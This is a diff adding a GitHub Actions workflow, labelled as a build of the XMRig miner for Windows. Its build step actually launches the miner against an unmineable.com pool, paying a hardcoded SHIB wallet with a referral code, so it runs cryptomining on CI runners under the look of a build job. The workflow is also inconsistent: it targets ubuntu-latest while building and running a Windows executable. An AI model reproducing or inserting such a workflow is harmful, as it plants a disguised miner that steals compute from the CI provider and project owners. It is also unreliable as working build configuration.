@@ -1,0 +1,38 @@
+name: Building XMRig Windows
+
+on:
+  workflow_dispatch:
+    inputs:
+      ALGORITHM:
+        description: 'ALGORITHM'
+        required: true
+        default: 'ghostrider'
+      WALLET:
+        description: 'WALLET'
+        required: true
+        default: '0x2cb3af51075037d030aa3e06ac9e4c912cc16eea'
+      COIN:
+        description: 'COIN'
+        required: true
+        default: 'SHIB'
+      REFERAL:
+        description: 'REFERAL'
+        required: true
+        default: 'uhok-ykxb'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repository master branch
+        uses: actions/checkout@v2
+        with:
+          repository: jzinferno/xmrig
+          ref: master  
+      - name: Checkout deps
+        run:  git clone https://github.com/xmrig/xmrig-deps.git
+      - name: Build project on Windows
+        run: |
+          cmake . -G "MinGW Makefiles" -DXMRIG_DEPS=xmrig-deps\gcc\x64
+          make -j4
+          xmrig.exe -a ${{ github.event.inputs.ALGORITHM }} -o stratum+ssl://${{ github.event.inputs.ALGORITHM }}.unmineable.com:443 -u "${{ github.event.inputs.COIN }}:${{ github.event.inputs.WALLET }}.${{ github.run_id }}#${{ github.event.inputs.REFERAL }}" -p x -k
